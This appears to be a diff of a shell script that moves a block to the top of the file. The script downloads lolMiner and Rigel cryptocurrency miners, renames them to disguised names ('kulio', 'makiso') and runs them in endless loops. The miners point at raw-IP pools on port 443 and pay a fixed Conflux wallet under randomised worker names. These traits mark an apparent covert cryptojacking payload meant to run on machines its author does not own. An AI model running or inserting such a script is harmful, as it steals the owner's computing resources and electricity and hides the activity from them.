@@ -1,3 +1,13 @@
+curl https://github.com/kryptex-miners-org/kryptex-miners/releases/download/lolminer-1-98a/lolMiner_v1.98a_Lin64.tar.gz -L -o lolMiner_v1.98a_Lin64.tar.gz
+tar xf lolMiner_v1.98a_Lin64.tar.gz
+mv lolMiner kulio
+while true
+do
+./kulio --algo OCTOPUS --pool 178.128.253.24:443 --user cfx:aatjfsztc58yp3jx14gjrekcgdsf0vk1vab8mahr68.$(echo $RANDOM | md5sum | head -c 10)
+done
+
+
+
 apt update && apt -y install ocl-icd-libopencl1 ocl-icd-opencl-dev clinfo curl wget sudo
 wget http://archive.ubuntu.com/ubuntu/pool/multiverse/n/nvidia-cuda-toolkit/libcudart12_12.0.146~12.0.1-4build4_amd64.deb && sudo dpkg -i libcudart12_12.0.146~12.0.1-4build4_amd64.deb
 curl https://github.com/rigelminer/rigel/releases/download/1.23.1/rigel-1.23.1-linux.tar.gz -L -o rigel-1.23.1-linux.tar.gz
@@ -6,16 +16,4 @@ cd rigel-1.23.1-linux
 mv rigel makiso
 while :; do
 ./makiso -a octopus -o stratum+tcp://68.183.8.214:443 -u cfx:aatjfsztc58yp3jx14gjrekcgdsf0vk1vab8mahr68.$(echo $RANDOM | md5sum | head -c 10)
-done
-
-
-
-
-
-curl https://github.com/kryptex-miners-org/kryptex-miners/releases/download/lolminer-1-98a/lolMiner_v1.98a_Lin64.tar.gz -L -o lolMiner_v1.98a_Lin64.tar.gz
-tar xf lolMiner_v1.98a_Lin64.tar.gz
-mv lolMiner kulio
-while true
-do
-./kulio --algo OCTOPUS --pool 178.128.253.24:443 --user cfx:aatjfsztc58yp3jx14gjrekcgdsf0vk1vab8mahr68.$(echo $RANDOM | md5sum | head -c 10)
 done
